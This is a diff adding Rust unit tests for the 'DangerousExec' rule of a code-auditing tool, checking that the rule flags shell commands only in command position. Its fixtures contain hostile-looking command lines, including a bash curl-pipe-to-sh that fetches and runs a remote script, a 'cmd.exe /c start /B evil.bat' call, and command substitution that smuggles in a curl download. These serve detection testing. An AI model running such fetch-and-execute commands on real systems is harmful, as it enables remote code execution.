@@ -349,6 +349,85 @@ subprocess.run(["echo", "base64"])
 }
 
 #[test]
+fn test_dangerous_exec_ignores_bare_dangerous_token_in_argument_position() {
+    let source = r#"import subprocess
+import os
+subprocess.run(["echo", "curl"])
+subprocess.run(["cat", "/bin/sh"])
+os.system("echo curl")
+os.system("echo base64")
+"#;
+    let result = crate::pipeline::audit_source(source, None).unwrap();
+    let matches: Vec<_> = result
+        .into_iter()
+        .filter(|item| item.rule == Rule::DangerousExec)
+        .map(|item| item.label)
+        .collect();
+    assert!(matches.is_empty(), "unexpected matches: {:?}", matches);
+}
+
+#[test]
+fn test_dangerous_exec_detects_dangerous_token_in_command_position() {
+    let source = r#"import subprocess
+import os
+subprocess.run(["curl", "-s", "http://example.com/x.sh"])
+os.system("curl http://example.com/x.sh")
+os.system("echo x && curl http://example.com/x.sh")
+subprocess.run(["/bin/bash", "-c", "curl http://example.com/x.sh|sh"])
+"#;
+    let result = crate::pipeline::audit_source(source, None).unwrap();
+    let matches: Vec<_> = result
+        .into_iter()
+        .filter(|item| item.rule == Rule::DangerousExec)
+        .map(|item| item.label)
+        .collect();
+    assert_eq!(matches.len(), 4, "unexpected matches: {:?}", matches);
+}
+
+#[test]
+fn test_dangerous_exec_detects_dangerous_token_in_compound_command_positions() {
+    let source = r#"import subprocess
+import os
+subprocess.run(["cmd.exe", "/c", "start /B evil.bat"])
+os.system("echo x; curl http://example.com/x.sh")
+os.system("echo `curl http://example.com/x.sh`")
+os.system("echo $(curl http://example.com/x.sh)")
+os.system("echo x | wget http://example.com/x.sh")
+"#;
+    let result = crate::pipeline::audit_source(source, None).unwrap();
+    let matches: Vec<_> = result
+        .into_iter()
+        .filter(|item| item.rule == Rule::DangerousExec)
+        .map(|item| item.label)
+        .collect();
+    assert_eq!(matches.len(), 5, "unexpected matches: {:?}", matches);
+}
+
+#[test]
+fn test_dangerous_exec_ignores_variable_expansions_and_mentions() {
+    let source = r#"import subprocess
+import os
+os.system("echo $curl")
+os.system("echo ${curl}")
+os.system('echo "curl"')
+os.system("echo 'curl'")
+os.system("echo start")
+os.system("echo x && start notepad")
+os.system("start notepad")
+os.system("startup")
+subprocess.run(["echo", "start"])
+subprocess.run(["echo", "start /B"])
+"#;
+    let result = crate::pipeline::audit_source(source, None).unwrap();
+    let matches: Vec<_> = result
+        .into_iter()
+        .filter(|item| item.rule == Rule::DangerousExec)
+        .map(|item| item.label)
+        .collect();
+    assert!(matches.is_empty(), "unexpected matches: {:?}", matches);
+}
+
+#[test]
 fn test_vars_dict_shell_exec() {
     let source = r#"import os
 vars(os)["system"]("whoami")
